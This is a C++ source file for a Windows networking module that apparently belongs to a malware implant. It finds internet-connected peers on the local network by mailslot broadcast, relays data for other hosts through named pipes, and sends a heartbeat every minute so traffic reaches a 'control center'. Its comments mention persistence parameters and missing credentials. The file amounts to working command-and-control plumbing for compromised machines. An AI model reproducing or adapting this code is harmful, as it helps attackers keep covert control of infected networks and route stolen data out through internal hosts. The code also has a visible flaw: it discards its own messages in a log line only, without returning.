/*
	NetworkConnectivity.cpp
	Routines for detecting a working internet connection and acting as proxy for requests.
	In case of no internet, finds other machines in local network via broadcast queries and use them as proxy for requests
	May contain other different transport modules via standartized interface


*/

#include <windows.h>



#include "..\shared\config.h"
#include "..\inc\dbg.h"

#include "..\inc\mem.h"					// ?? possibly no need to be converted to API ??
#include "..\inc\CryptoStrings.h"		// +
#include "..\inc\HashedStrings.h"		// +
#include "..\inc\RandomGen.h"			// +
#include "..\inc\MyStringRoutines.h"	// +
#include "..\inc\MailslotWorks.h"
#include "..\shared\CommStructures.h"
#include "..\inc\NetMessageEnvelope.h"
#include "..\inc\PipeWorks.h"			// + 


// internal code modules
//#include "transport_WinHTTP.h"
//#include "transport_Pipes.h"
#include "transport_Generic.h"

#include "NetworkConnectivity.h"


// NB: struct defined at transport_Generic.h
NETWORK_CONNECTIVITY_CONTEXT g_ncContext;



// adds or updates a record to nml
// NB: caller should already hold cs lock
VOID nmlAddUpdateRecord(LPWSTR wszMachineName)
{
	UINT64 i64NameHash = HashStringW(wszMachineName);
	BOOL bFound = FALSE;	// indicating found status
	NEL_MACHINE_ITEM *nelItem = NULL;	// new item to be added, if no such record found, or scanning item ptr

	// check if this is ours name -> no add
	if (i64NameHash == g_ncContext.i64MachineNameHash) { DbgPrint("self msg throwing away"); }

	if (g_ncContext.lnmlCount) {

		// scan items from head
		nelItem = g_ncContext.nmlHead.lcNext;

		while (nelItem) {

			// check if hash matches
			if (nelItem->i64MachineNameHash == i64NameHash) {

				nelItem->dwTicksReceived = GetTickCount();
				bFound = TRUE;
				break;

			} // match found

			// go to next item
			nelItem = nelItem->lcNext;

		} // while more items

	} // g_ncContext.lnmlCount > 0

	// if not found, add new item
	if (!bFound) {

		// max items count check
		if (g_ncContext.lnmlCount > 128) { DbgPrint("ERR: new item not added, amount threshold (128) exceeded"); return; }

		// alloc new item 
		nelItem = (NEL_MACHINE_ITEM *)my_alloc(sizeof(NEL_MACHINE_ITEM));
		nelItem->wszMachineName = (LPWSTR)my_alloc(128);
		nelItem->dwTicksReceived = GetTickCount();
		nelItem->i64MachineNameHash = i64NameHash;
		lstrcpyn(nelItem->wszMachineName, wszMachineName, 32);

		// link to chain, increasing total items count
		nelItem->lcNext = g_ncContext.nmlHead.lcNext;
		g_ncContext.nmlHead.lcNext = nelItem;
		g_ncContext.lnmlCount++;

	} // !bFound

}


// scans list and unlinks node from it
// modify resulting items count
// NB: it is up to caller to dispose all needed buffers
// NB2: caller should hold cs lock while calling this
VOID nmlUnlink(NEL_MACHINE_ITEM *nelRemove)
{
	NEL_MACHINE_ITEM *nelItem = NULL;	// moving ptr
	NEL_MACHINE_ITEM *nelPrev = NULL;	// prev ptr to modify link

	nelPrev = &g_ncContext.nmlHead;
	nelItem = g_ncContext.nmlHead.lcNext;

	while ((nelItem) && (nelItem != nelRemove)) {

		// move ptrs
		nelPrev = nelItem;
		nelItem = nelItem->lcNext;

	} // while have ptr and not found result

	// check if found item
	if (nelItem != nelRemove) { DbgPrint("ERR: chunk %p for removal not found in list", nelRemove); return; }

	// ok, have chunk to be removed, unlink it
	nelPrev->lcNext = nelRemove->lcNext;
	g_ncContext.lnmlCount--;

}

/*
	Scans nml list and returns a value with lowest ticks value
	Found value is removed from list
	Returns NULL if list is empty
	NB: for non-null result, caller should dispose returned buffer itself
	CS is entered internally
*/
LPWSTR nmlGetFreshestItem()
{
	NEL_MACHINE_ITEM *nelItem = NULL;	// moving ptr

	NEL_MACHINE_ITEM *nelFound = NULL;

	LPWSTR wszMachine = NULL;	// resulting ptr from chunk

	// check for items
	if (!g_ncContext.lnmlCount) { DbgPrint("empty list, exiting"); return NULL; }

	// cs enter
	EnterCriticalSection(&g_ncContext.csNetworkEnabledListAccess);

	// do enum
	nelItem = g_ncContext.nmlHead.lcNext;
	nelFound = g_ncContext.nmlHead.lcNext;

	while (nelItem) {

		if (nelItem->dwTicksReceived < nelFound->dwTicksReceived) { nelFound = nelItem; }

		nelItem = nelItem->lcNext;
	}

	DbgPrint("selected item at %p, machine [%ws]", nelFound, nelFound->wszMachineName);

	wszMachine = nelFound->wszMachineName;

	nmlUnlink(nelFound);
	my_free(nelFound); // free only node itself, it's buffer with machine name to be sent to caller

	LeaveCriticalSection(&g_ncContext.csNetworkEnabledListAccess);

	return wszMachine;
}

// responds on broadcasted mailslots messages of SPN_QUERY & SPN_ANSWER types AND pipe messages with  Q_REMOTESEND & Q_CHECKSTATUS
// also saves SPN_ANSWER from other machines to some internal list to avoid sending SPN_QUERY broadcast 
BOOL CALLBACK ncPipeProxy(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;	// by default, return FALSE allowing other callback to attempt parsing the packet
	BOOL bNetworkEnabled; // internal flag indicating if we have network access

	INNER_ENVELOPE *iEnvelope = NULL;	// second envelope for client request, allocated at pipe.PMI_SEND_QUERY

	do { // not a loop

		// SPN_QUERY & SPN_ANSWER responder
		if (dcp->csType == ST_MAILSLOT)  {

			// check for query type
			switch (dcp->bInputMessageId) {

		
			case MMI_NETWORK_ENABLED_SEARCH:
				bRes = TRUE;

				// someone searching for network-enabled machines
				// lock current transport and check it's type
				bNetworkEnabled = FALSE;

				// this cs is locked only when transport in init phase
				if (!TryEnterCriticalSection(&g_ncContext.csTransportAccess)) { DbgPrint("NOTE: transport in init phase, no processing for MMI_NETWORK_ENABLED_SEARCH"); break; }

				// if transport inited
				if ((g_ncContext.pTransportHandle) && (g_ncContext.pTransportHandle->ncType != NCT_LOCAL_ONLY)) { bNetworkEnabled = TRUE; }

				LeaveCriticalSection(&g_ncContext.csTransportAccess);

				if (bNetworkEnabled) {

					DbgPrint("we have network access, sending answer");
					mwSendMailslotMessageToAllDomains(g_ncContext.wszMachineName, g_ncContext.dwMachineNameLen, MMI_NETWORK_ENABLED_ANSWER);

				} // bNetworkEnabled
				
				break;

			case MMI_NETWORK_ENABLED_ANSWER:
				bRes = TRUE;

				// someone answers it has network access, it's name is in dcp->pData
				// attempt to store it
				DbgPrint("got pipe server name [%ws]", (LPWSTR)dcp->pInBuffer);

				// try to enter cs with no lock to avoid hanging up callback processing for too long
				if (!TryEnterCriticalSection(&g_ncContext.csNetworkEnabledListAccess)) { DbgPrint("NOTE: cs NEL enter failed, trowing MMI_NETWORK_ENABLED_ANSWER msg away"); break; }

				// store result with overwrite / timing update
				nmlAddUpdateRecord((LPWSTR)dcp->pInBuffer);

				LeaveCriticalSection(&g_ncContext.csNetworkEnabledListAccess);

				break;

			} // switch bAnswerMessageId

		} // ST_MAILSLOT

		// Q_REMOTESEND & Q_CHECKSTATUS responder
		if (dcp->csType == ST_PIPE)  {

			switch (dcp->bInputMessageId) {

			case PMI_SEND_QUERY:
				bRes = TRUE;

				DbgPrint("PMI_SEND_QUERY received");

				// remote client needs to send data. Add to internal list and return id via special structure
				// client assumed to send PERSISTENCE_PARAMS struct + data in envelope
				CHUNK_HANDLE cHandle; // tsgenAddOutgoingChunk() result

				// casted ptrs
				PERSISTENCE_PARAMS *pp; 
				LPVOID pData;
				DWORD dwDataLen;

				pp = (PERSISTENCE_PARAMS *)dcp->pInBuffer;
				pData = (LPVOID)((SIZE_T)dcp->pInBuffer + sizeof(PERSISTENCE_PARAMS));
				dwDataLen = dcp->lInBufferLen - sizeof(PERSISTENCE_PARAMS);

				// safety check 
				if (dcp->lInBufferLen < sizeof(PERSISTENCE_PARAMS) + 1) { DbgPrint("ERR: inner data of envelope size mismatch, min expected %u, found %u", (sizeof(PERSISTENCE_PARAMS) + 1), dcp->lInBufferLen); bRes = FALSE; break; }

				// overlay received buffer into INNER_ENVELOPE, instructing server to process it as a solid group of chunks
				// and return answers in the same manner, so we can feed it directly to remote pipe client, like it would read it from server directly
				iEnvelope = cmsAllocInitInnerEnvelope(pData, dwDataLen, EID_REMOTE_CHUNKS_BUFFER);

				if (!(cHandle = tsgenAddOutgoingChunk(iEnvelope, dwDataLen + sizeof(INNER_ENVELOPE), pp->vciType, pp->vsSource))) { DbgPrint("ERR: failed to add chunk"); break; }

				DbgPrint("remote client added chunk with handle %p of len %u", cHandle, dwDataLen);

				// send cHandle to caller as UINT64 (x64 ptr)
				UINT64 *pi64Res;
				pi64Res = (UINT64 *)my_alloc(sizeof(UINT64));	// alloc mem to be disposed at callback manager (PipeWorks.cpp)
				*pi64Res = (UINT64)cHandle;


				// assign result to be sent to caller
				dcp->pAnswer = pi64Res;
				dcp->lAnswerLen = sizeof(UINT64);
				dcp->bAnswerMessageId = PMI_SEND_QUERY;

				break;


			case PMI_CHECK_STATUS_QUERY:
				bRes = TRUE;

				DbgPrint("PMI_CHECK_STATUS_QUERY received");

				// simply check result by an id
			
				// safety check
				if (dcp->lInBufferLen < sizeof(UINT64)) { DbgPrint("ERR: inner data of evelope size mismatch, min expected %u, found %u", sizeof(UINT64), dcp->lInBufferLen); bRes = FALSE; break; }

				UINT64 *pi64Query = (UINT64 *)dcp->pInBuffer;	// to cast input ptr
				
				// to save query results
				CHUNK_STATUS cStatus;
				LPVOID pAnswer = NULL;
				DWORD dwAnswerLen = 0;

				// check result
				cStatus = tsgenQueryOutgoingChunkStatus((CHUNK_HANDLE)(LPVOID)*pi64Query, &pAnswer, &dwAnswerLen);

				DbgPrint("remote client queried status for chunk %p, res=%u, p=%p len=%u", (LPVOID)*pi64Query, (BYTE)cStatus, pAnswer, dwAnswerLen);

				// prepare resulting structure - byte + answer, if any
				dcp->lAnswerLen = sizeof(BYTE) + dwAnswerLen;
				dcp->pAnswer = my_alloc(dcp->lAnswerLen);
				dcp->bAnswerMessageId = PMI_CHECK_STATUS_QUERY;

				// put answer data
				*(BYTE *)dcp->pAnswer = (BYTE)cStatus;
				if (dwAnswerLen) {
					memcpy((LPVOID)((SIZE_T)dcp->pAnswer + sizeof(BYTE)), pAnswer, dwAnswerLen);
					my_free(pAnswer);
				} // dwAnswerLen

				break;


			} // switch bAnswerMessageId

		} // ST_PIPE

	} while (FALSE); // not a loop

	// cleanup, if needed
	if (iEnvelope) { my_free(iEnvelope); }

	return bRes;
}

/*
	Responds on ST_NETWORK_SEND query, without any answer for caller. 
	Remote clients need to query via pipe requests handled by ncPipeProxy() status of chunk sent and any data with commands from server (using tsgenQueryOutgoingChunkStatus())
*/
BOOL CALLBACK ncNetworkSendHandler(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;	// by default, return FALSE allowing other callback to attempt parsing the packet
	CHUNK_HANDLE cHandle = NULL;

	if (dcp->csType == ST_NETWORK_SEND) {

		// this is our CB, parse it
		bRes = TRUE;
	
		cHandle = tsgenAddOutgoingChunk(dcp->pInBuffer, dcp->lInBufferLen, dcp->ppParams.vciType, dcp->ppParams.vsSource);

		// actually, we may send cHandle to caller later, but need an extra interface so caller will be able to check it's status
		// So, leave it to be implemented later, if needed

	}	// ST_NETWORK_SEND

	return bRes;
}

UINT64 ncGetMachineHash() 
{
	return g_ncContext.i64MachineNameHash;
}


/*
	A thread which periodically adds a special knock chunk so server
	comm thread will communicate to control center anyway
*/
DWORD WINAPI thrKnockChunkAdder(LPVOID lpParameter)
{
	INNER_ENVELOPE *iEnvelope;	// resulting enveloped data

	DbgPrint("entered");

	// infinite working loop
	while (TRUE) {

		// add volatile chunk
		iEnvelope = cmsAllocInitInnerEnvelope(NULL, 0, EID_HEARTBEAT);
		tsgenAddOutgoingChunk(iEnvelope, sizeof(INNER_ENVELOPE), VOLATILE_HEARTBEAT, SOURCE_LOCAL);
		my_free(iEnvelope);

		// there is no matter of big delay here, as real network communications
		// uses it's own delay mechanism.
		Sleep(1 * 60 * 1000);

	} // infinite loop

}


/*
	Started by a worker thread
*/
VOID ncStartNetworkConnectivity()
{
	DWORD dwThreadId;	// CreateThread()'s result

	DbgPrint("entered");

	// init global context var
	memset(&g_ncContext, 0, sizeof(NETWORK_CONNECTIVITY_CONTEXT));
	InitializeCriticalSection(&g_ncContext.csTransportAccess);
	InitializeCriticalSection(&g_ncContext.csNetworkEnabledListAccess);

	g_ncContext.wszMachineName = (LPWSTR)my_alloc(512);
	g_ncContext.dwMachineNameLen = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerName(g_ncContext.wszMachineName, &g_ncContext.dwMachineNameLen);
	g_ncContext.i64MachineNameHash = HashStringW(g_ncContext.wszMachineName);

	// add null terminator, tchar->bytes conversion
	g_ncContext.dwMachineNameLen++;
	g_ncContext.dwMachineNameLen *= 2;


	// init tsgen routines, while transport is still in init phase
	// work routines are checking context to wait for a new handle to be supplied
	tsgenInit(&g_ncContext);

	// add a callback for serving requests to remote server using DataCallbackManager's api
	// this enables other modules to use ST_NETWORK_SEND queries
	dcmAddDataCallback(ncNetworkSendHandler);

	// start pipe responding server which will handle remote requests for Q_SEND & Q_CHECKSTATUS
	// also, in the same routine, a mailslot processing callback will answer for SPN_QUERY issued by other hosts initializing their pipes transport
	dcmAddDataCallback(ncPipeProxy);

	// selects a working remote-connection transport, may take a while
	while (!tsgenSelectTransport(&g_ncContext)) { DbgPrint("no transport inited yet, retry in 15 minutes"); Sleep(15 * 60 * 1000); }

	// create a thread re-sending knock chunk to notify server about us
	// without this thread, in case of no creds received, no server communication will be established at all
	CloseHandle(CreateThread(NULL, 0, thrKnockChunkAdder, NULL, 0, &dwThreadId));

	DbgPrint("done initial transport init, ncType=%u", g_ncContext.pTransportHandle->ncType);


}